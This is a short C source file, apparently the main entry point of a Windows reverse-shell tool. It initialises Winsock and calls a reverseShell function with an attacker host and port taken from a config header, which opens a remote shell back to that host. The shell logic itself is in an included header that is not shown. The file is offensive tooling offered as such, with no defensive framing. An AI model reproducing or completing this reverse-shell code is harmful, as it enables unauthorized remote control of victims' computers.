#include <stdio.h>
#include <stdlib.h>
#include <windef.h>
#include <winsock2.h>

#include "error.h"
#include "reverse_shell.h"
#include "config.h"

/*
 * Starts WinSocket and call reverseShell
 * @return != 0 on error
 */
int main(void) {

    WSADATA WSAVersion;
    int ret;

    if (WSAStartup(MAKEWORD(2, 2), &WSAVersion)) {
        ERROR_MSG("Winsock failed to start");
        return EXIT_FAILURE;
    }

    ret = (int)reverseShell(RS_HOSTNAME, RS_PORT);

    WSACleanup();

    return ret;

}

